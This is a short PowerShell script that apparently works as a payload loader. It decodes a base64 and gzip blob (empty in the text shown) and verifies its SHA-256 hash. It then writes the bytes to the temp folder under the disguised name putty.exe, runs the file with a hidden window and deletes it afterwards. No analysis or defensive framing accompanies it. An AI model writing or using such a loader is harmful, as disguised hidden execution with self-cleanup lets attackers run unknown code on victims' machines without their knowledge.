$b64 = ""
$expectedHash = "4c70267ca03a00ea761ec358498b990a7221decb36eace9b7dbe6a751be0fb3b"

$bytes = [System.Convert]::FromBase64String($b64)
$ms = New-Object System.IO.MemoryStream(, $bytes)
$gs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$out = New-Object System.IO.MemoryStream
$gs.CopyTo($out)
$decodedBytes = $out.ToArray()

$sha256 = [System.Security.Cryptography.SHA256]::Create()
$hashBytes = $sha256.ComputeHash($decodedBytes)
$actualHash = [BitConverter]::ToString($hashBytes).Replace("-", "").ToLower()

if ($actualHash -eq $expectedHash) {
    $exePath = Join-Path $env:TEMP "putty.exe"
    [System.IO.File]::WriteAllBytes($exePath, $decodedBytes)
    Start-Process -FilePath $exePath -WindowStyle Hidden -Wait
    Remove-Item -Path $exePath -Force
    Write-Host "[+] Execution successful."
} else {
    Write-Error "[-] Verification failed! Expected: $expectedHash, Got: $actualHash"
}
